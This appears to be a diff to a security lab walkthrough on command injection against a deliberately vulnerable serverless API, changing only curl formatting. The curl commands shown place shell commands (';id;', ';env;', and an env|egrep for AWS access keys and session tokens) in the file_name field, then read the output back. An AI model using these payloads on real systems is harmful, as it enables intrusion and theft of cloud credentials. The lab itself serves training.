@@ -43,13 +43,15 @@ Use your knowledge of how you can conduct command injection against this vulnera
     2. You *could* run the script again, but here is the output (using `$TARGET` in place of the actual CloudFront URL):
 
         ```bash
-        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";id;","file_data":"dGVzdAo="}'
+        curl -w '\n' -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+          -d '{"file_name":";id;","file_data":"dGVzdAo="}'
         ```
 
     3. If you want to list a user's environment variables, it's quite easy in Linux using the `env` command. So try to replace `id` with `env`:
 
         ```bash
-        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env;","file_data":"dGVzdAo="}'
+        curl -w '\n' -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+          -d '{"file_name":";env;","file_data":"dGVzdAo="}'
         ```
 
         !!! summary "Expected Results"
@@ -63,7 +65,8 @@ Use your knowledge of how you can conduct command injection against this vulnera
     5. Try this command to limit the amount of characters returned by only matching lines that contain the variable names we're after:
 
         ```bash
-        curl -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'
+        curl -w '\n' -X POST $TARGET/api/ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+          -d '{"file_name":";env|egrep \"(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)\"","file_data":"dGVzdAo="}'
         ```
 
         !!! summary "Expected Result"
@@ -75,7 +78,7 @@ Use your knowledge of how you can conduct command injection against this vulnera
     6. Now we're talking! But where are the results? If you remember, to acquire the file name, MD5, and SHA1 sum data, you send a `GET` to `/api/`.
 
         ```bash
-        curl $TARGET/api/
+        curl -w '\n' $TARGET/api/
         ```
 
         !!! summary "Expected Results"
